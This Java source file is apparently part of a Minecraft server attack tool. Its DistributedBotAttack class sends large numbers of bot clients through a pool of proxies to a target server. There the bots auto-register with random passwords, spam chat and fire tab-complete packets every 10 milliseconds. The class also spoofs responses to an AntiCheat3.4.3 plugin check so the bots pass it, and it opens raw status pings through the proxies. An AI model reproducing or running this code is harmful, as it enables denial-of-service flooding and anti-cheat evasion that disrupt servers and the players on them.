package co.akarin.EndMinecraftUltra.attack;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.Proxy;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import com.github.steveice10.mc.protocol.MinecraftProtocol;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientChatPacket;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
import com.github.steveice10.packetlib.Client;
import com.github.steveice10.packetlib.Session;
import com.github.steveice10.packetlib.event.session.*;
import com.github.steveice10.packetlib.tcp.TcpSessionFactory;

import co.akarin.EndMinecraftUltra.protocol.ACP;
import co.akarin.EndMinecraftUltra.utils.mainUtils;
import co.akarin.EndMinecraftUltra.proxy.ProxyPool;
import co.akarin.EndMinecraftUltra.main.Config;
import co.akarin.EndMinecraftUltra.protocol.MCForge;

public class DistributedBotAttack extends IAttack{

    private Thread mainThread;
    private Thread tabThread;
    private Thread taskThread;

    public List<Client> clients=new ArrayList<Client>();
    public ExecutorService pool=Executors.newCachedThreadPool();

    private ACP acp=new ACP();

    private long starttime;

    public DistributedBotAttack(int time,int maxconnect,int joinsleep,boolean motdbefore,boolean tab,HashMap<String,String> modList) {
        super(time,maxconnect,joinsleep,motdbefore,tab,modList);
    }

    public void start(final String ip,final int port) {
	    setTask(() -> {
            while (true) {
                for (Client c : clients) {
                    if (c.getSession().isConnected()) {
                        if (c.getSession().hasFlag("login")) {
                            c.getSession().send(new ClientChatPacket(Config.instance.getRandMessage()));
                        } else if (c.getSession().hasFlag("join")) {
                            String pwd = mainUtils.getRandomString(7, 12);
                            c.getSession().send(new ClientChatPacket(Config.instance.getRegisterCommand(pwd)));
                            c.getSession().setFlag("login", true);
                        }

                    }
                }
                mainUtils.sleep(5 * 1000);
            }
        });

        this.starttime=System.currentTimeMillis();

        mainThread=new Thread(()->{
            while(true) {
                try {
                    cleanClients();
                    createClients(ip,port);
                    mainUtils.sleep(10*1000);

                    if(this.attack_time>0&&(System.currentTimeMillis()-this.starttime)/1000>this.attack_time) {
                        clients.forEach(c->{
                            c.getSession().disconnect("");
                        });
                        stop();
                        return;
                    }
                    mainUtils.log("BotThread", "连接数:"+clients.size());
                }catch(Exception e){
                    mainUtils.log("BotThread",e.getMessage());
                }
            }
        });

        if(this.attack_tab) {
            tabThread=new Thread(()-> {
                while(true) {
                    synchronized (clients) {
                        clients.forEach(c->{
                            if(c.getSession().isConnected()) {
                                if(c.getSession().hasFlag("join")) {
                                    sendTab(c.getSession(),"/");
                                }
                            }
                        });
                    }
                    mainUtils.sleep(10);
                }
            });
        }

        mainThread.start();
        if(tabThread!=null) tabThread.start();
        if(taskThread!=null) taskThread.start();
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        mainThread.stop();
        if(tabThread!=null) tabThread.stop();
        if(taskThread!=null) taskThread.stop();
    }

    public void setTask(Runnable task) {
        taskThread=new Thread(task);
    }

    private void cleanClients() {
        List<Client> waitRemove=new ArrayList<Client>();
        synchronized (clients) {
            clients.forEach(c->{
                if(!c.getSession().isConnected()) {
                    waitRemove.add(c);
                }
            });
            clients.removeAll(waitRemove);
        }
    }

    private void createClients(final String ip,int port) {
        synchronized(ProxyPool.proxys) {
            ProxyPool.proxys.forEach(p->{
                try {
                    String[] _p=p.split(":");
                    Proxy proxy=new Proxy(Proxy.Type.HTTP,new InetSocketAddress(_p[0],Integer.parseInt(_p[1])));
                    Client client=createClient(ip, port, Config.instance.getRandUsername(), proxy);
                    client.getSession().setReadTimeout(10*1000);
                    client.getSession().setWriteTimeout(10*1000);
                    synchronized (clients) {
                        clients.add(client);
                    }


                    if(this.attack_motdbefore) {
                        pool.submit(()->{
                            getMotd(proxy,ip,port);
                            client.getSession().connect(false);
                        });
                    }else{
                        client.getSession().connect(false);
                    }

                    if(this.attack_maxconnect>0&&(clients.size()>this.attack_maxconnect)) return;
                    if(this.attack_joinsleep>0) mainUtils.sleep(attack_joinsleep);
                }catch(Exception e){
                    mainUtils.log("BotThread/CreateClients",e.getMessage());
                }
            });
        }
    }

    public Client createClient(final String ip,int port,final String username, Proxy proxy) {
        Client client=new Client(ip,port,new MinecraftProtocol(username), new TcpSessionFactory(proxy));
        new MCForge(client.getSession(),this.modList).init();
        client.getSession().addListener(new SessionListener() {
            public void packetReceived(PacketReceivedEvent e) {
                if (e.getPacket() instanceof ServerPluginMessagePacket) {
                    ServerPluginMessagePacket packet=e.getPacket();
                    switch(packet.getChannel()) {
                        case "AntiCheat3.4.3":
                            String code=acp.uncompress(packet.getData());
                            byte[] checkData=acp.getCheckData("AntiCheat.jar",code,new String[] {"44f6bc86a41fa0555784c255e3174260"});
                            e.getSession().send(new ClientPluginMessagePacket("AntiCheat3.4.3",checkData));
                            break;
                        default:
                    }
                }else if (e.getPacket() instanceof ServerJoinGamePacket) {
                    e.getSession().setFlag("join",true);
                    mainUtils.log("Client","[连接成功]["+username+"]");
                }
            }

            @Override
            public void packetSending(PacketSendingEvent event) {}
            public void packetSent(PacketSentEvent e){}

            public void connected(ConnectedEvent e){}
            public void disconnecting(DisconnectingEvent e){}
            public void disconnected(DisconnectedEvent e){
                String msg;
                if(e.getCause()!=null) {
                    msg=e.getCause().getMessage();
                }else{
                    msg=e.getReason();
                }
                mainUtils.log("Client","[断开连接]["+username+"] " +msg);
            }
        });
        return client;
    }

    public boolean getMotd(Proxy proxy, String ip, int port) {
        try {
            Socket socket=new Socket(proxy);
            socket.connect(new InetSocketAddress(ip, port));
            if (socket.isConnected()) {
                OutputStream out=socket.getOutputStream();
                InputStream in=socket.getInputStream();
                out.write(new byte[] {0x07,0x00,0x05,0x01,0x30,0x63,(byte)0xDD,0x01});
                out.write(new byte[] {0x01,0x00});
                out.flush();
                in.read();

                try {
                    in.close();
                    out.close();
                    socket.close();
                } catch (Exception e) {}

                return true;
            }
            socket.close();
        } catch (Exception e) {}
        return false;
    }

    public void sendTab(Session session,String text) {
        try {
            Class<?> cls=ClientTabCompletePacket.class;
            Constructor<?> constructor=cls.getDeclaredConstructor();
            constructor.setAccessible(true);
            ClientTabCompletePacket packet=(ClientTabCompletePacket) constructor.newInstance();
            Field field = cls.getDeclaredField("text");
            field.setAccessible(true);
            field.set(packet,text);
            session.send(packet);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
